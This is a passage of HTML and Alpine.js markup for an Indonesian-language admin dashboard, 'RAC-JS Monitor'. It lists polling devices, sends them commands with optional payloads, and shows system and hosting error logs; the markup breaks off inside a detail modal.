<!DOCTYPE html>
<html lang="id" class="dark">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAC-JS Admin Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/@alpinejs/collapse@3.x.x/dist/cdn.min.js"></script>
    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    colors: { primary: '#4f46e5', }
                }
            }
        }
    </script>
    <style>
        [x-cloak] {
            display: none !important;
        }

        .toast-enter {
            transform: translateY(-100%);
            opacity: 0;
        }

        .toast-enter-active {
            transform: translateY(0);
            opacity: 1;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        .toast-leave {
            transform: translateY(0);
            opacity: 1;
        }

        .toast-leave-active {
            transform: translateY(-100%);
            opacity: 0;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
    </style>
</head>

<body class="bg-gray-900 text-gray-300 min-h-screen font-sans antialiased" x-data="dashboard()">
    <!-- Toast Notification System -->
    <div class="fixed top-4 right-4 z-[100] flex flex-col gap-2" x-cloak>
        <template x-for="toast in toasts" :key="toast.id">
            <div class="border-l-[5px] p-4 rounded-xl shadow-[0_8px_30px_rgb(0,0,0,0.5)] flex items-center justify-between min-w-[300px] transform transition-all duration-300 backdrop-blur-md"
                x-transition:enter="transition ease-out duration-300"
                x-transition:enter-start="opacity-0 translate-y-[-1rem] scale-95"
                x-transition:enter-end="opacity-100 translate-y-0 scale-100"
                x-transition:leave="transition ease-in duration-300"
                x-transition:leave-start="opacity-100 translate-y-0 scale-100"
                x-transition:leave-end="opacity-0 translate-y-[-1rem] scale-95"
                :class="{'border-green-500 bg-green-900/80': toast.type === 'success', 'border-red-500 bg-red-900/80': toast.type === 'error'}">
                <div class="flex items-center gap-3">
                    <!-- Icon -->
                    <span x-show="toast.type === 'success'" class="text-green-400 bg-green-900/50 p-1.5 rounded-full">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7">
                            </path>
                        </svg>
                    </span>
                    <span x-show="toast.type === 'error'" class="text-red-400 bg-red-900/50 p-1.5 rounded-full">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M6 18L18 6M6 6l12 12"></path>
                        </svg>
                    </span>
                    <span x-text="toast.message" class="text-sm font-bold text-white tracking-wide"></span>
                </div>
                <button @click="dismissToast(toast.id)"
                    class="text-gray-300 hover:text-white hover:bg-white/10 p-1 rounded-md ml-4 transition-colors focus:outline-none">
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12">
                        </path>
                    </svg>
                </button>
            </div>
        </template>
    </div>

    <!-- Header -->
    <header class="bg-gray-800 border-b border-gray-700 p-4 sticky top-0 z-40 shadow-sm">
        <div class="max-w-7xl mx-auto flex justify-between items-center">
            <h1 class="text-xl font-bold text-white tracking-tight flex items-center gap-2">
                <svg class="w-6 h-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                        d="M19.428 15.428a2 2 0 00-1.022-.547l-2.387-.477a6 6 0 00-3.86.517l-.318.158a6 6 0 01-3.86.517L6.05 15.21a2 2 0 00-1.806.547M8 4h8l-1 1v5.172a2 2 0 00.586 1.414l5 5c1.26 1.26.367 3.414-1.415 3.414H4.828c-1.782 0-2.674-2.154-1.414-3.414l5-5A2 2 0 009 10.172V5L8 4z">
                    </path>
                </svg>
                RAC-JS <span class="text-primary font-normal">Monitor</span>
            </h1>
            <form action="/admin/logout" method="POST">
                <button type="submit"
                    class="text-sm bg-gray-700 hover:bg-gray-600 px-4 py-2 rounded-lg transition-colors border border-gray-600 text-white font-medium flex items-center gap-2">
                    Logout
                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1">
                        </path>
                    </svg>
                </button>
            </form>
        </div>
    </header>

    <main class="max-w-7xl mx-auto p-4 flex flex-col lg:flex-row gap-6 mt-4">
        <!-- Devices Panel Layout -->
        <section class="w-full lg:w-1/3 flex flex-col gap-6">
            <!-- Connected Devices Card -->
            <div
                class="bg-gray-800 rounded-2xl border border-gray-700 p-5 shadow-lg relative flex flex-col flex-1 max-h-[500px]">
                <div class="flex justify-between items-center mb-5">
                    <h2 class="text-lg font-semibold text-white flex items-center gap-2">
                        <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z">
                            </path>
                        </svg>
                        Perangkat Tersambung
                    </h2>
                    <button @click="fetchDevices"
                        class="text-primary hover:text-indigo-400 p-1 bg-gray-900 rounded-md transition-colors"
                        title="Refresh">
                        <svg class="w-4 h-4" :class="{'animate-spin': isFetchingDevices}" fill="none"
                            stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15">
                            </path>
                        </svg>
                    </button>
                </div>

                <div class="flex flex-col gap-3 overflow-y-auto pr-1">
                    <template x-for="device in devices" :key="device.id">
                        <div class="bg-gray-900 p-4 rounded-xl border border-gray-700 flex flex-col gap-2 cursor-pointer hover:border-primary/50 transition-all duration-200"
                            @click="selectedDevice = device.id"
                            :class="{'border-primary shadow-[0_0_15px_rgba(79,70,229,0.15)]': selectedDevice === device.id}">
                            <div class="flex justify-between items-start">
                                <div class="flex flex-col">
                                    <span class="font-mono text-sm font-bold text-white tracking-wide"
                                        x-text="device.id"></span>
                                </div>
                                <div class="flex items-center gap-2">
                                    <div class="flex items-center gap-2 bg-gray-800 px-2 py-1 rounded-full border border-gray-700">
                                        <span class="text-[9px] font-bold tracking-tighter" :class="device.polling_mode === 'short' ? 'text-yellow-400' : 'text-blue-400'" x-text="device.polling_mode === 'short' ? 'TURBO' : 'LONG'"></span>
                                    </div>
                                    <button @click.stop="togglePollingMode(device.id, device.polling_mode)" 
                                        class="bg-gray-800 hover:bg-gray-700 text-gray-400 hover:text-white p-1 rounded-md border border-gray-700 transition-colors"
                                        :title="'Switch to ' + (device.polling_mode === 'short' ? 'Normal' : 'Turbo') + ' mode'">
                                        <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 7h12m0 0l-4-4m4 4l-4 4m0 6H4m0 0l4 4m-4-4l4-4"></path>
                                        </svg>
                                    </button>
                                    <div
                                        class="flex items-center gap-2 bg-gray-800 px-2 py-1 rounded-full border border-gray-700">
                                        <span class="w-2.5 h-2.5 rounded-full"
                                            :class="device.is_online ? 'bg-green-500 shadow-[0_0_8px_rgba(34,197,94,0.6)]' : 'bg-red-500 shadow-[0_0_8px_rgba(239,68,68,0.6)]'"></span>
                                        <span class="text-[10px] uppercase font-bold tracking-wider"
                                            :class="device.is_online ? 'text-green-500' : 'text-red-500'"
                                            x-text="device.is_online ? 'ONLINE' : 'OFFLINE'"></span>
                                    </div>
                                    <button @click.stop="deleteDevice(device.id)"
                                        class="text-gray-500 hover:text-red-500 transition-colors p-1"
                                        title="Hapus Perangkat">
                                        <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                                d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16">
                                            </path>
                                        </svg>
                                    </button>
                                </div>
                            </div>
                            <div class="text-xs text-gray-500 flex items-center gap-1 mt-1">
                                <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                </svg>
                                Terakhir aktif: <span x-text="formatDate(device.last_seen)"></span>
                            </div>
                        </div>
                    </template>
                    <div x-show="devices.length === 0"
                        class="text-sm text-gray-500 flex flex-col items-center justify-center py-10 h-full gap-3 text-center">
                        <svg class="w-10 h-10 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
                                d="M9.172 16.172a4 4 0 015.656 0M9 10h.01M15 10h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z">
                            </path>
                        </svg>
                        Belum ada perangkat terhubung. Pastikan alat menyala dan melakukan polling.
                    </div>
                </div>
            </div>

            <!-- Command Sender Card -->
            <div class="bg-gray-800 rounded-2xl border border-gray-700 p-5 shadow-lg transition-all duration-300"
                x-show="selectedDevice" x-transition.opacity>
                <h2 class="text-lg font-semibold text-white mb-4 flex items-center gap-2">
                    <svg class="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                            d="M8 9l3 3-3 3m5 0h3M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z">
                        </path>
                    </svg>
                    Kirim Perintah
                </h2>

                <div class="flex flex-col gap-4">
                    <div class="bg-gray-900 border border-gray-700 p-3 rounded-lg flex justify-between items-center">
                        <span class="text-xs text-gray-400 uppercase tracking-wider font-bold">Target Perangkat</span>
                        <span class="font-mono text-sm text-primary font-bold bg-primary/10 px-2 py-0.5 rounded"
                            x-text="selectedDevice"></span>
                    </div>

                    <div class="space-y-3 mt-1">
                        <div class="relative" @click.away="showAutocomplete = false">
                            <label class="text-xs font-semibold text-gray-400 block mb-1">Perintah (Command)</label>
                            <input type="text" x-model="cmdInput" @input="filterCommands(); showAutocomplete = true"
                                @focus="filterCommands(); showAutocomplete = true"
                                @keydown.arrow-down.prevent="if(showAutocomplete) hoverIndex = Math.min(hoverIndex + 1, filteredCommands.length - 1)"
                                @keydown.arrow-up.prevent="if(showAutocomplete) hoverIndex = Math.max(hoverIndex - 1, 0)"
                                @keydown.enter.prevent="if(showAutocomplete && filteredCommands[hoverIndex]) selectCommand(filteredCommands[hoverIndex])"
                                @keydown.escape="showAutocomplete = false" placeholder="Ketik perintah (misal: restart)"
                                class="w-full px-4 py-2.5 rounded-lg bg-gray-900 border border-gray-700 focus:border-primary focus:ring-1 focus:ring-primary text-white outline-none text-sm transition-all placeholder-gray-600">

                            <!-- Autocomplete Dropdown -->
                            <div x-show="showAutocomplete && filteredCommands.length > 0" x-transition.opacity
                                class="absolute z-50 w-full mt-1 bg-gray-900 border border-gray-700 rounded-lg shadow-2xl max-h-60 overflow-y-auto overflow-x-hidden">
                                <template x-for="(cmd, index) in filteredCommands" :key="cmd.name">
                                    <div @click="selectCommand(cmd)" @mouseenter="hoverIndex = index"
                                        :class="{'bg-gray-800 border-l-2 border-primary': hoverIndex === index, 'border-l-2 border-transparent': hoverIndex !== index}"
                                        class="px-4 py-2.5 cursor-pointer hover:bg-gray-800 transition-colors flex flex-col gap-1">
                                        <div class="flex items-center gap-2">
                                            <span class="text-sm font-bold text-white font-mono"
                                                x-text="cmd.name"></span>
                                            <span x-show="cmd.needsPayload"
                                                class="text-[9px] bg-indigo-500/20 text-indigo-400 border border-indigo-500/30 px-1.5 py-0.5 rounded font-bold uppercase tracking-wider">Butuh
                                                Payload</span>
                                        </div>
                                        <span class="text-xs text-gray-500" x-text="cmd.desc"></span>
                                    </div>
                                </template>
                            </div>
                        </div>
                        <div>
                            <label class="text-xs font-semibold text-gray-400 block mb-1">Payload Ekstra
                                (Opsional)</label>
                            <input type="text" x-model="textInput" x-ref="payloadInput"
                                placeholder="Argumen tambahan..."
                                class="w-full px-4 py-2.5 rounded-lg bg-gray-900 border border-gray-700 focus:border-primary focus:ring-1 focus:ring-primary text-white outline-none text-sm transition-all placeholder-gray-600">
                        </div>

                        <button @click="sendCommand()"
                            class="w-full bg-primary hover:bg-indigo-500 text-white text-sm font-bold py-3 px-4 rounded-lg transition-all transform active:scale-[0.98] disabled:opacity-50 disabled:active:scale-100 mt-2 flex justify-center items-center gap-2 shadow-lg shadow-primary/30"
                            :disabled="!cmdInput.trim() || isSending">
                            <span x-show="!isSending">Kirim Eksekusi</span>
                            <span x-show="isSending" class="flex items-center gap-2">
                                <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white"
                                    xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor"
                                        stroke-width="4"></circle>
                                    <path class="opacity-75" fill="currentColor"
                                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
                                    </path>
                                </svg>
                                Mengirim...
                            </span>
                        </button>
                    </div>

                </div>
            </div>
        </section>

        <!-- System Logs Panel -->
        <section class="w-full lg:w-2/3">
            <div
                class="bg-gray-800 rounded-2xl border border-gray-700 p-5 shadow-lg h-full flex flex-col min-h-[500px]">
                <div class="flex justify-between items-center mb-5 flex-wrap gap-3">
                    <div class="flex items-center bg-gray-900 p-1 rounded-xl border border-gray-700">
                        <button @click="activeTab = 'system'"
                            :class="activeTab === 'system' ? 'bg-primary text-white shadow-lg shadow-primary/20' : 'text-gray-400 hover:text-gray-200'"
                            class="px-4 py-1.5 rounded-lg text-sm font-bold transition-all flex items-center gap-2">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M4 6h16M4 10h16M4 14h16M4 18h16"></path>
                            </svg>
                            Log Sistem
                        </button>
                        <button @click="activeTab = 'hosting'"
                            :class="activeTab === 'hosting' ? 'bg-red-600 text-white shadow-lg shadow-red-600/20' : 'text-gray-400 hover:text-gray-200'"
                            class="px-4 py-1.5 rounded-lg text-sm font-bold transition-all flex items-center gap-2 relative">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z">
                                </path>
                            </svg>
                            Log Hosting
                            <span x-show="hostLogs.length > 0" class="absolute -top-1 -right-1 flex h-2.5 w-2.5">
                                <span
                                    class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
                                <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-red-500"></span>
                            </span>
                        </button>
                    </div>

                    <div class="flex gap-2">
                        <!-- Selector Clear Logs System -->
                        <div class="relative items-center flex h-full" x-show="activeTab === 'system'"
                            x-data="{ openOptions: false, options: [{val:0, lbl:'Semua Log'}, {val:1, lbl:'> 1 Hari'}, {val:7, lbl:'> 7 Hari'}] }">
                            <button @click="openOptions = !openOptions" @click.away="openOptions = false" type="button"
                                class="text-[10px] md:text-xs bg-gray-900 hover:bg-gray-800/50 text-gray-300 border border-red-500/30 rounded-l-md px-2.5 py-1.5 h-full focus:outline-none border-r-0 flex items-center justify-between gap-1.5 min-w-[90px] transition-colors shadow-sm">
                                <span x-text="options.find(o => o.val == clearLogDays).lbl" class="font-medium"></span>
                                <svg class="w-3 h-3 text-gray-500 transform transition-transform"
                                    :class="openOptions ? 'rotate-180' : ''" fill="none" stroke="currentColor"
                                    viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M19 9l-7 7-7-7"></path>
                                </svg>
                            </button>

                            <div x-show="openOptions" x-transition.opacity
                                class="absolute top-full left-0 mt-1 w-32 bg-gray-900 border border-gray-700 rounded-lg shadow-2xl z-50 overflow-hidden"
                                x-cloak>
                                <template x-for="opt in options" :key="opt.val">
                                    <button @click="clearLogDays = opt.val; openOptions = false;"
                                        class="block w-full text-left px-3 py-2 text-xs hover:bg-gray-800 transition-colors"
                                        :class="clearLogDays == opt.val ? 'text-red-400 font-bold bg-gray-800/80 border-l-2 border-red-500' : 'text-gray-400 border-l-2 border-transparent'"
                                        x-text="opt.lbl">
                                    </button>
                                </template>
                            </div>
                            <button @click="clearLogs()"
                                class="bg-red-600/20 hover:bg-red-600/40 text-red-400 border border-red-500/30 px-3 py-1.5 rounded-r-md transition-colors active:scale-95 flex items-center justify-center gap-1.5 h-full"
                                title="Eksekusi Hapus Log Sistem">
                                <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                        d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16">
                                    </path>
                                </svg>
                                <span class="text-xs font-bold hidden sm:inline-block">Clear Log</span>
                            </button>
                        </div>

                        <!-- Button Clear Hosting Logs -->
                        <button @click="clearHostLogs()" x-show="activeTab === 'hosting'"
                            class="bg-red-600/20 hover:bg-red-600/40 text-red-400 border border-red-500/30 px-3 py-1.5 rounded-md text-xs font-bold transition-all flex items-center gap-1.5 active:scale-95"
                            title="Kosongkan stderr.log">
                            <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16">
                                </path>
                            </svg>
                            <span class="hidden sm:inline-block">Clear stderr.log</span>
                        </button>
                        <span
                            class="text-xs text-gray-500 bg-gray-900 px-2 py-1 rounded border border-gray-700 self-center hidden md:inline-block">Auto-refresh
                            5s</span>
                        <button @click="fetchLogs"
                            class="text-primary hover:text-indigo-400 p-1.5 bg-gray-900 rounded-md transition-colors"
                            title="Refresh Log">
                            <svg class="w-4 h-4" :class="{'animate-spin': isFetchingLogs}" fill="none"
                                stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                    d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15">
                                </path>
                            </svg>
                        </button>
                    </div>
                </div>

                <!-- System Logs Tab Content -->
                <div x-show="activeTab === 'system'" x-transition:enter="transition ease-out duration-300"
                    x-transition:enter-start="opacity-0 translate-y-2"
                    x-transition:enter-end="opacity-100 translate-y-0" class="flex flex-col flex-1 min-h-0">
                    <div class="overflow-x-auto flex-1 border border-gray-700 rounded-xl bg-gray-900 shadow-inner">
                        <table class="w-full text-sm text-left text-gray-400 whitespace-nowrap">
                            <thead
                                class="text-xs text-gray-300 uppercase bg-gray-800 border-b border-gray-700 sticky top-0">
                                <tr>
                                    <th scope="col" class="px-5 py-4 font-semibold tracking-wider">Timestamp</th>
                                    <th scope="col" class="px-5 py-4 font-semibold tracking-wider">Device ID</th>
                                    <th scope="col" class="px-5 py-4 font-semibold tracking-wider text-center">Level
                                    </th>
                                    <th scope="col" class="px-5 py-4 font-semibold tracking-wider w-full">Message</th>
                                    <th scope="col" class="px-5 py-4 font-semibold tracking-wider text-right">Aksi</th>
                                </tr>
                            </thead>
                            <tbody class="divide-y divide-gray-800">
                                <template x-for="log in logs" :key="log.id">
                                    <tr class="hover:bg-gray-800/50 transition-colors">
                                        <td class="px-5 py-3 text-xs tracking-tight text-gray-400"
                                            x-text="log.created_at">
                                        </td>
                                        <td class="px-5 py-3 font-mono text-xs text-primary font-semibold"
                                            x-text="log.device_id || '-'"></td>
                                        <td class="px-5 py-3 text-center">
                                            <div class="inline-flex items-center px-2.5 py-1 rounded-md text-[10px] font-bold uppercase tracking-widest border"
                                                :class="{
                                                'bg-red-500/10 text-red-500 border-red-500/20': ['ERROR', 'failed'].includes(log.level), 
                                                'bg-green-500/10 text-green-500 border-green-500/20': ['INFO', 'completed'].includes(log.level), 
                                                'bg-yellow-500/10 text-yellow-500 border-yellow-500/20': ['WARN', 'pending'].includes(log.level),
                                                'bg-blue-500/10 text-blue-500 border-blue-500/20': log.level === 'sent'
                                            }">
                                                <span x-text="log.level"></span>
                                            </div>
                                        </td>
                                        <td class="px-5 py-3 text-sm font-mono text-gray-300">
                                            <div class="max-w-[300px] md:max-w-[400px] lg:max-w-[500px] truncate"
                                                x-text="log.message" :title="log.message"></div>
                                        </td>
                                        <td class="px-5 py-3 text-right">
                                            <button x-show="log.type !== 'cmd'" @click="openDetailModal(log.id)"
                                                class="inline-flex items-center gap-1 bg-primary/10 hover:bg-primary/20 text-primary border border-primary/20 hover:border-primary/40 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all shadow-sm active:scale-95">
                                                <span>Detail</span>
                                                <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor"
                                                    viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round"
                                                        stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
                                                    <path stroke-linecap="round" stroke-linejoin="round"
                                                        stroke-width="2"
                                                        d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z">
                                                    </path>
                                                </svg>
                                            </button>
                                            <span x-show="log.type === 'cmd'"
                                                class="text-[10px] text-gray-500 italic block py-1.5 px-3">No
                                                Detail</span>
                                        </td>
                                    </tr>
                                </template>
                                <tr x-show="logs.length === 0">
                                    <td colspan="5" class="px-5 py-12 text-center text-gray-500">
                                        <div class="flex flex-col items-center gap-2">
                                            <svg class="w-8 h-8 text-gray-600" fill="none" stroke="currentColor"
                                                viewBox="0 0 24 24">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
                                                    d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10">
                                                </path>
                                            </svg>
                                            Tidak ada catatan log ditemukan.
                                        </div>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>

                <!-- Hosting Logs Tab Content -->
                <div x-show="activeTab === 'hosting'" x-transition:enter="transition ease-out duration-300"
                    x-transition:enter-start="opacity-0 translate-y-2"
                    x-transition:enter-end="opacity-100 translate-y-0" class="flex flex-col flex-1 min-h-0" x-cloak>
                    <div class="flex flex-col gap-4 overflow-y-auto pr-1">
                        <template x-for="(err, index) in hostLogs" :key="err.id">
                            <div
                                class="bg-gray-900 border border-gray-700 rounded-xl overflow-hidden shadow-sm transition-all hover:border-red-500/30">
                                <div @click="expandedLogs[err.id] = !expandedLogs[err.id]"
                                    class="p-4 flex items-center justify-between cursor-pointer hover:bg-gray-800/50 transition-colors gap-4">
                                    <div class="flex items-center gap-3 min-w-0">
                                        <div class="p-2 bg-red-500/10 rounded-lg shrink-0">
                                            <svg class="w-4 h-4 text-red-500" fill="none" stroke="currentColor"
                                                viewBox="0 0 24 24">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                                    d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                            </svg>
                                        </div>
                                        <div class="truncate">
                                            <p class="text-sm font-bold text-gray-200 truncate" x-text="err.title"></p>
                                            <p class="text-[10px] text-gray-500 mt-0.5 font-mono"
                                                x-text="'UNIT ERROR #' + (hostLogs.length - index)"></p>
                                        </div>
                                    </div>
                                    <div class="flex items-center gap-2 shrink-0">
                                        <button @click.stop="copyToClipboard(err.full)"
                                            class="p-1.5 text-gray-500 hover:text-white hover:bg-gray-700 rounded-md transition-all"
                                            title="Salin Full Log">
                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                                    d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z">
                                                </path>
                                            </svg>
                                        </button>
                                        <svg class="w-5 h-5 text-gray-600 transform transition-transform duration-200"
                                            :class="expandedLogs[err.id] ? 'rotate-180' : ''" fill="none"
                                            stroke="currentColor" viewBox="0 0 24 24">
                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                                                d="M19 9l-7 7-7-7"></path>
                                        </svg>
                                    </div>
                                </div>
                                <div x-show="expandedLogs[err.id]" x-collapse x-cloak
                                    class="border-t border-gray-800 bg-black/30 p-4">
                                    <div class="relative group">
                                        <pre class="text-[11px] font-mono text-red-300 leading-relaxed overflow-x-auto whitespace-pre-wrap rounded-lg bg-black/40 p-3 border border-red-900/20"
                                            x-text="err.full"></pre>
                                        <div class="absolute top-2 right-2 flex gap-2">
                                            <span
                                                class="text-[9px] font-bold text-red-500/50 uppercase tracking-tighter">Raw
                                                Stack Trace</span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </template>
                        <div x-show="hostLogs.length === 0" class="text-center py-20 flex flex-col items-center gap-4">
                            <div
                                class="w-16 h-16 bg-gray-800 rounded-full flex items-center justify-center text-gray-600">
                                <svg class="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5"
                                        d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                                </svg>
                            </div>
                            <div>
                                <h3 class="text-gray-300 font-bold">Semua Aman!</h3>
                                <p class="text-sm text-gray-500">Tidak ada Error Hosting yang terekam pada stderr.log.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </main>
    <!-- Custom Confirm Modal -->
    <div x-show="isConfirmOpen"
        class="fixed inset-0 z-[60] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4" x-cloak
        x-transition.opacity>
        <div class="bg-gray-900 border border-gray-700 rounded-2xl shadow-2xl w-full max-w-sm p-6 transform transition-all text-center relative"
            @click.away="closeConfirm()" x-transition:enter="ease-out duration-300"
            x-transition:enter-start="opacity-0 scale-95 -translate-y-4"
            x-transition:enter-end="opacity-100 scale-100 translate-y-0" x-transition:leave="ease-in duration-200"
            x-transition:leave-start="opacity-100 scale-100 translate-y-0"
            x-transition:leave-end="opacity-0 scale-95 translate-y-4">

            <div class="w-16 h-16 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg class="w-8 h-8 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                        d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z">
                    </path>
                </svg>
            </div>

            <h3 class="text-xl font-bold text-white mb-2" x-text="confirmTitle"></h3>
            <p class="text-sm text-gray-400 mb-6" x-text="confirmMessage"></p>

            <div class="flex gap-3 w-full">
                <button @click="closeConfirm()"
                    class="flex-1 bg-gray-800 hover:bg-gray-700 text-gray-300 font-semibold py-2.5 px-4 rounded-xl transition-all active:scale-95 border border-gray-700">Batal</button>
                <button @click="if(onConfirm) { onConfirm(); closeConfirm(); }"
                    class="flex-1 bg-red-600 hover:bg-red-500 text-white font-semibold py-2.5 px-4 rounded-xl shadow-lg shadow-red-600/30 transition-all active:scale-95">Ya,
                    Lanjutkan</button>
            </div>
        </div>
    </div>

    <!-- Detail Modal -->
    <div x-show="isDetailModalOpen"
        class="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-sm p-4" x-cloak
        x-transition:enter="transition ease-out duration-300" x-transition:enter-start="opacity-0"
        x-transition:enter-end="opacity-100" x-transition:leave="transition ease-in duration-200"
        x-transition:leave-start="opacity-100" x-transition:leave-end="opacity-0">
        <div class="bg-gray-800 border border-gray-700 rounded-2xl shadow-2xl w-full max-w-4xl flex flex-col max-h-[90vh] overflow-hidden transform transition-all"
            @click.away="closeDetailModal()">
            <div class="p-4 md:p-5 border-b border-gray-700 flex justify-between items-center bg-gray-800/80">
                <h3 class="text-lg font-bold text-white flex items-center gap-2">
